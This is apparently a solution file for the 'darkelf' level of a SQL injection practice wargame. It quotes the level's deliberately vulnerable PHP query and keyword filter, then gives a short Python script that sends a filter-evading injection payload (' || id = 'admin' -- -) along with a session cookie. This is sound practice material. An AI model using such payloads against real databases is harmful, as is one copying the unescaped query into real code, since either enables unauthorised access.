'''
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect();  
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("darkelf"); 
  highlight_file(__FILE__); 
?>
'''
import requests
from urllib import parse

host = "https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php?pw="
cookies = {"PHPSESSID" : "8s7khiq67rue3qlsffsskni093"}
param = "%27%20||%20id%20=%20%27admin%27%20--%20-"
res = requests.get(host + parse.quote(param), cookies=cookies)
print(res.text)
